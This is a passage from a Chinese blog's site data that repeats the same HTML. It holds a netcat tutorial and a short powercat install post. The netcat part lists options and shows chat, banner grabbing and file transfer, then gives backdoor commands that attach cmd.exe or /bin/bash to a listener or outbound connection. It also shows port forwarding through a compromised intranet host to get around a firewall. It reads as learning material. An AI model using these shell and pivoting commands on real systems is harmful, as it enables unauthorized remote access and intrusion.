class=\"line\"></span><br><span class=\"line\">-i, --idle-timeout &lt;time&gt; 空闲读/写超时时间</span><br><span class=\"line\"></span><br><span class=\"line\">-p, --source-port port 指定要使用的源端口</span><br><span class=\"line\"></span><br><span class=\"line\">-s, --source addr 指定要使用的源地址（不影响-l）</span><br><span class=\"line\"></span><br><span class=\"line\">-l, --listen 绑定并监听传入的连接</span><br><span class=\"line\"></span><br><span class=\"line\">-k, --keep-open 在侦听模式下接受多个连接</span><br><span class=\"line\"></span><br><span class=\"line\">-n, --nodns 不通过DNS解析主机名</span><br><span class=\"line\"></span><br><span class=\"line\">-t, --telnet 回答Telnet协商</span><br><span class=\"line\"></span><br><span class=\"line\">-u, --udp 使用UDP代替默认TCP</span><br><span class=\"line\"></span><br><span class=\"line\">\t--sctp 使用SCTP代替默认TCP</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-v, --verbose 使用SCTP代替默认TCP</span><br><span class=\"line\"></span><br><span class=\"line\">-w, --wait &lt;time&gt; 连接超时时间</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-z   零I/O模式，仅报告连接状态</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"1-模拟聊天\"><a href=\"#1-模拟聊天\" class=\"headerlink\" title=\"1. 模拟聊天\"></a>1. 模拟聊天</h2><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [端口号]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [服务器ip] [服务器端口]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-Banner抓取方法\"><a href=\"#2-Banner抓取方法\" class=\"headerlink\" title=\"2.Banner抓取方法\"></a>2.Banner抓取方法</h2><ul>\n<li>Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;&quot; | nc -v -n w1 [target_ip] [开始端口-结束端口]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"3-文件传输\"><a href=\"#3-文件传输\" class=\"headerlink\" title=\"3.文件传输\"></a>3.文件传输</h2><h3 id=\"从客户端传输文件到服务器\"><a href=\"#从客户端传输文件到服务器\" class=\"headerlink\" title=\"从客户端传输文件到服务器\"></a>从客户端传输文件到服务器</h3><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [端口号] &gt; out_filename</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [目标IP] [目标端口] &lt; in_flimename</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"从服务器传输文件到客户端\"><a href=\"#从服务器传输文件到客户端\" class=\"headerlink\" title=\"从服务器传输文件到客户端\"></a>从服务器传输文件到客户端</h3><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [端口号] &lt; in_filename</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [目标IP] [目标端口] &gt; out_flimename</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"4-目录传输（与文件传输类似）\"><a href=\"#4-目录传输（与文件传输类似）\" class=\"headerlink\" title=\"4.目录传输（与文件传输类似）\"></a>4.目录传输（与文件传输类似）</h2><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -cvf - dir_name | nc -l [port_id]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -n [target_ip] [target_port] | tar -xvf - </span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"5-windows建立后门的方法\"><a href=\"#5-windows建立后门的方法\" class=\"headerlink\" title=\"5. windows建立后门的方法\"></a>5. windows建立后门的方法</h2><h3 id=\"服务器——监听型后门\"><a href=\"#服务器——监听型后门\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [port_id] -e cmd.exe</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端——连接型后门\"><a href=\"#客户端——连接型后门\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [target_ip] [target_port] -e cmd.exe</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"6、Linux下建立后门\"><a href=\"#6、Linux下建立后门\" class=\"headerlink\" title=\"6、Linux下建立后门\"></a>6、Linux下建立后门</h2><h3 id=\"服务器——监听型后门-1\"><a href=\"#服务器——监听型后门-1\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [port_id] -e /bin/bash</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端——连接型后门-1\"><a href=\"#客户端——连接型后门-1\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [target_ip] [target_port] -e /bin/bash</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"7、连接转发\"><a href=\"#7、连接转发\" class=\"headerlink\" title=\"7、连接转发\"></a>7、连接转发</h2><ul>\n<li>可以解决的问题</li>\n</ul>\n<ol>\n<li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># bat文件中的内容： nc [ip_B] [port_B]</span><br><span class=\"line\">A: nc -l -p [port_A] -e XX.bat</span><br><span class=\"line\">B: nc -l -p [port_B] </span><br><span class=\"line\">C: nc [ip_A] [prt_A]</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## 原理同上</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"8、反弹shell\"><a href=\"#8、反弹shell\" class=\"headerlink\" title=\"8、反弹shell\"></a>8、反弹shell</h2><p><a href=\"https://imgchr.com/i/BFDrmd\"><img \"\" class=\"lazyload placeholder\" data-original=\"https://s1.ax1x.com/2020/10/22/BFDrmd.md.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"BFDrmd.md.png\"></a></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"netcat命令选项\"><a href=\"#netcat命令选项\" class=\"headerlink\" title=\"netcat命令选项\"></a>netcat命令选项</h2><h4 id=\"本文参考文章链接\"><a href=\"#本文参考文章链接\" class=\"headerlink\" title=\"本文参考文章链接\"></a>本文参考文章链接</h4><p><a href=\"https://www.fujieace.com/linux/nc-2.html\">本文参考文章链接1</a></p>\n<p><a href=\"https://jiajunhuang.com/articles/2020_09_19-linux_cmd_netcat.md.html\">本文参考文章链接2</a></p>\n<p><a href=\"https://www.cnblogs.com/lpfuture/p/5719066.html\">本文参考文章链接3</a></p>","more":"<h3 id=\"常用命令选项\"><a href=\"#常用命令选项\" class=\"headerlink\" title=\"常用命令选项\"></a>常用命令选项</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## 网络模式和代理相关</span><br><span class=\"line\">-l 监听，作服务器。不填时作客户端。</span><br><span class=\"line\">-u UDP模式。不填时默认TCP模式。</span><br><span class=\"line\">-X 和 -x 是代理相关的选项</span><br><span class=\"line\"></span><br><span class=\"line\">## 其余常用选项</span><br><span class=\"line\">-v verbose模式，打印更多日志</span><br><span class=\"line\">-z 连接以后就断开，用于测试网络连接是否连通 //探测端口的连通性</span><br><span class=\"line\">-w 超时时间，单位是秒</span><br><span class=\"line\">-s 指定source addr</span><br><span class=\"line\">-p 指定source port</span><br><span class=\"line\">-n 只识别IP地址，不查询DNS</span><br><span class=\"line\">-k 处理完一个请求之后，继续监听下一个</span><br><span class=\"line\">-d 脱离命令行窗口，在后台运行，常用于后门建立的过程</span><br><span class=\"line\">-e 执行某个程序，常用于后门建立的过程</span><br><span class=\"line\">-L 设置netcat处于监听状态等待链接，当客户端断开，服务器依旧回到等待状态</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"基本全部命令选项\"><a href=\"#基本全部命令选项\" class=\"headerlink\" title=\"基本全部命令选项\"></a>基本全部命令选项</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用法：</span><br><span class=\"line\"></span><br><span class=\"line\">ncat [选项] [主机名] [端口]</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">花费时间的选项以秒为单位。 附加“ ms”毫秒，“ s”表示秒，“ m”表示分钟，或“ h”表示小时（例如500ms）。</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-4    仅使用IPv4</span><br><span class=\"line\"></span><br><span class=\"line\">-6    仅使用IPv6</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-U, --unixsock 仅使用Unix域套接字</span><br><span class=\"line\"></span><br><span class=\"line\">\t--vsock 仅使用vsock套接字</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-C, --crlf 将CRLF用于EOL序列</span><br><span class=\"line\"></span><br><span class=\"line\">-c, --sh-exec &lt;command&gt; 通过/bin/sh执行给定命令</span><br><span class=\"line\"></span><br><span class=\"line\">-e, --exec &lt;command&gt; 执行给定命令</span><br><span class=\"line\"></span><br><span class=\"line\">\t--lua-exec &lt;filename&gt; 执行给定的Lua脚本</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-g hop1[,hop2,...] 松散的源路由跳跃点（最大8个）</span><br><span class=\"line\"></span><br><span class=\"line\">-G &lt;n&gt; 松散的源路由跳跃指针（4、8、12，...）</span><br><span class=\"line\"></span><br><span class=\"line\">-m, --max-conns &lt;n&gt; 最大&lt;n&gt;同时连接</span><br><span class=\"line\"></span><br><span class=\"line\">-h, --help 显示此帮助屏幕</span><br><span class=\"line\"></span><br><span class=\"line\">-d, --delay &lt;time&gt; 在读/写之间等待时间</span><br><span class=\"line\"></span><br><span class=\"line\">-o, --output &lt;filename&gt; 将会话数据转储到文件中</span><br><span class=\"line\"></span><br><span class=\"line\">-x, --hex-dump &lt;filename&gt; 将会话数据以十六进制形式转储到文件中</span><br><span class=\"line\"></span><br><span class=\"line\">-i, --idle-timeout &lt;time&gt; 空闲读/写超时时间</span><br><span class=\"line\"></span><br><span class=\"line\">-p, --source-port port 指定要使用的源端口</span><br><span class=\"line\"></span><br><span class=\"line\">-s, --source addr 指定要使用的源地址（不影响-l）</span><br><span class=\"line\"></span><br><span class=\"line\">-l, --listen 绑定并监听传入的连接</span><br><span class=\"line\"></span><br><span class=\"line\">-k, --keep-open 在侦听模式下接受多个连接</span><br><span class=\"line\"></span><br><span class=\"line\">-n, --nodns 不通过DNS解析主机名</span><br><span class=\"line\"></span><br><span class=\"line\">-t, --telnet 回答Telnet协商</span><br><span class=\"line\"></span><br><span class=\"line\">-u, --udp 使用UDP代替默认TCP</span><br><span class=\"line\"></span><br><span class=\"line\">\t--sctp 使用SCTP代替默认TCP</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-v, --verbose 使用SCTP代替默认TCP</span><br><span class=\"line\"></span><br><span class=\"line\">-w, --wait &lt;time&gt; 连接超时时间</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">-z   零I/O模式，仅报告连接状态</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"1-模拟聊天\"><a href=\"#1-模拟聊天\" class=\"headerlink\" title=\"1. 模拟聊天\"></a>1. 模拟聊天</h2><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [端口号]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [服务器ip] [服务器端口]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-Banner抓取方法\"><a href=\"#2-Banner抓取方法\" class=\"headerlink\" title=\"2.Banner抓取方法\"></a>2.Banner抓取方法</h2><ul>\n<li>Banner是一个文本，Banner是一个你连接的服务器发送给你的文本信息。当你试图鉴别漏洞或者服务的类型和版本的时候，Banner信息是非常有用的。但是，并不是所有的服务都会发送banner。一旦你发现开放的端口，你可以容易的使用netcat 连接服务抓取他们的banner。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;&quot; | nc -v -n w1 [target_ip] [开始端口-结束端口]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"3-文件传输\"><a href=\"#3-文件传输\" class=\"headerlink\" title=\"3.文件传输\"></a>3.文件传输</h2><h3 id=\"从客户端传输文件到服务器\"><a href=\"#从客户端传输文件到服务器\" class=\"headerlink\" title=\"从客户端传输文件到服务器\"></a>从客户端传输文件到服务器</h3><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [端口号] &gt; out_filename</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [目标IP] [目标端口] &lt; in_flimename</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"从服务器传输文件到客户端\"><a href=\"#从服务器传输文件到客户端\" class=\"headerlink\" title=\"从服务器传输文件到客户端\"></a>从服务器传输文件到客户端</h3><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [端口号] &lt; in_filename</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [目标IP] [目标端口] &gt; out_flimename</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"4-目录传输（与文件传输类似）\"><a href=\"#4-目录传输（与文件传输类似）\" class=\"headerlink\" title=\"4.目录传输（与文件传输类似）\"></a>4.目录传输（与文件传输类似）</h2><ul>\n<li>服务器</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -cvf - dir_name | nc -l [port_id]</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>客户端</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -n [target_ip] [target_port] | tar -xvf - </span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"5-windows建立后门的方法\"><a href=\"#5-windows建立后门的方法\" class=\"headerlink\" title=\"5. windows建立后门的方法\"></a>5. windows建立后门的方法</h2><h3 id=\"服务器——监听型后门\"><a href=\"#服务器——监听型后门\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [port_id] -e cmd.exe</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端——连接型后门\"><a href=\"#客户端——连接型后门\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [target_ip] [target_port] -e cmd.exe</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"6、Linux下建立后门\"><a href=\"#6、Linux下建立后门\" class=\"headerlink\" title=\"6、Linux下建立后门\"></a>6、Linux下建立后门</h2><h3 id=\"服务器——监听型后门-1\"><a href=\"#服务器——监听型后门-1\" class=\"headerlink\" title=\"服务器——监听型后门\"></a>服务器——监听型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -l -p [port_id] -e /bin/bash</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"客户端——连接型后门-1\"><a href=\"#客户端——连接型后门-1\" class=\"headerlink\" title=\"客户端——连接型后门\"></a>客户端——连接型后门</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [target_ip] [target_port] -e /bin/bash</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"7、连接转发\"><a href=\"#7、连接转发\" class=\"headerlink\" title=\"7、连接转发\"></a>7、连接转发</h2><ul>\n<li>可以解决的问题</li>\n</ul>\n<ol>\n<li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台弱鸡进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">假设机器A和机器B是内网机器，机器B是我们的目标机器，机器C是外网机器，机器C和机器A是出于同一网段的，可以互相访问，机器C不可以访问机器B</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># bat文件中的内容： nc [ip_B] [port_B]</span><br><span class=\"line\">A: nc -l -p [port_A] -e XX.bat</span><br><span class=\"line\">B: nc -l -p [port_B] </span><br><span class=\"line\">C: nc [ip_A] [prt_A]</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">## 原理同上</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"8、反弹shell\"><a href=\"#8、反弹shell\" class=\"headerlink\" title=\"8、反弹shell\"></a>8、反弹shell</h2><p><a href=\"https://imgchr.com/i/BFDrmd\"><img src=\"https://s1.ax1x.com/2020/10/22/BFDrmd.md.png\" alt=\"BFDrmd.md.png\"></a></p>"},{"title":"powercat的使用","date":"2020-09-14T06:06:00.000Z","swiper":false,"swiperImg":"","img":"http://cdn.mxrblog.cn/ct_14.jpg","top":false,"_content":"\n# powercat\n\n- powercat是netcat的powershell版本，可以在windows系统上使用\n\n## 一、安装powercat\n\n- [GitHub下载链接](git clone https://github.com/besimorhino/powercat.git)\n- 管理员权限打开powershell，进入powercat下载目录，打开README.md文档，按照上面的步骤进行操作，如果显示系统无法加载这种情况：\n\n<!--more-->\n```\n: 无法加载文件 C:\\Users\\herol\\Documents\\powercat\\powercat.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。\n```\n\n- 在powershell输入以下命令（注意要以管理员权限）：\n\n```\nSet-ExecutionPolicy RemoteSigned\n```\n\n- 输入y即可，接着可以输入powercat -h测试是否安装成功\n\n\n\n## 二、使用powercat\n\n- powercat -h 或 vim README.md查看帮助文件 \n\n\n\n","source":"_posts/powercat.md","raw":"---\ntitle: powercat的使用\ndate: 2020-09-14 14:06\nswiper: false # 将改文章放入轮播图中\nswiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片\nimg: 'http://cdn.mxrblog.cn/ct_14.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片\ncategories: tool\ntags: [powercat, tool, kali]   # 可以是数组\ntop: false\n---\n\n# powercat\n\n- powercat是netcat的powershell版本，可以在windows系统上使用\n\n## 一、安装powercat\n\n- [GitHub下载链接](git clone https://github.com/besimorhino/powercat.git)\n- 管理员权限打开powershell，进入powercat下载目录，打开README.md文档，按照上面的步骤进行操作，如果显示系统无法加载这种情况：\n\n<!--more-->\n```\n: 无法加载文件 C:\\Users\\herol\\Documents\\powercat\\powercat.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。\n```\n\n- 在powershell输入以下命令（注意要以管理员权限）：\n\n```\nSet-ExecutionPolicy RemoteSigned\n```\n\n- 输入y即可，接着可以输入powercat -h测试是否安装成功\n\n\n\n## 二、使用powercat\n\n- powercat -h 或 vim README.md查看帮助文件 \n\n\n\n","slug":"powercat","published":1,"updated":"2021-06-20T03:03:43.175Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckq4nzaxt000e7vvtei98cdzo","content":"<h1 id=\"powercat\"><a href=\"#powercat\" class=\"headerlink\" title=\"powercat\"></a>powercat</h1><ul>\n<li>powercat是netcat的powershell版本，可以在windows系统上使用</li>\n</ul>\n<h2 id=\"一、安装powercat\"><a href=\"#一、安装powercat\" class=\"headerlink\" title=\"一、安装powercat\"></a>一、安装powercat</h2><ul>\n<li>[GitHub下载链接](git clone <a href=\"https://github.com/besimorhino/powercat.git\">https://github.com/besimorhino/powercat.git</a>)</li>\n<li>管理员权限打开powershell，进入powercat下载目录，打开README.md文档，按照上面的步骤进行操作，如果显示系统无法加载这种情况：</li>\n</ul>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">: 无法加载文件 C:\\Users\\herol\\Documents\\powercat\\powercat.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在powershell输入以下命令（注意要以管理员权限）：</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy RemoteSigned</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>输入y即可，接着可以输入powercat -h测试是否安装成功</li>\n</ul>\n<h2 id=\"二、使用powercat\"><a href=\"#二、使用powercat\" class=\"headerlink\" title=\"二、使用powercat\"></a>二、使用powercat</h2><ul>\n<li>powercat -h 或 vim README.md查看帮助文件 </li>\n</ul>\n","site":{"data":{}},"excerpt":"<h1 id=\"powercat\"><a href=\"#powercat\" class=\"headerlink\" title=\"powercat\"></a>powercat</h1><ul>\n<li>powercat是netcat的powershell版本，可以在windows系统上使用</li>\n</ul>\n<h2 id=\"一、安装powercat\"><a href=\"#一、安装powercat\" class=\"headerlink\" title=\"一、安装powercat\"></a>一、安装powercat</h2><ul>\n<li>[GitHub下载链接](git clone <a href=\"https://github.com/besimorhino/powercat.git\">https://github.com/besimorhino/powercat.git</a>)</li>\n<li>管理员权限打开powershell，进入powercat下载目录，打开README.md文档，按照上面的步骤进行操作，如果显示系统无法加载这种情况：</li>\n</ul>","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">: 无法加载文件 C:\\Users\\herol\\Documents\\powercat\\powercat.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 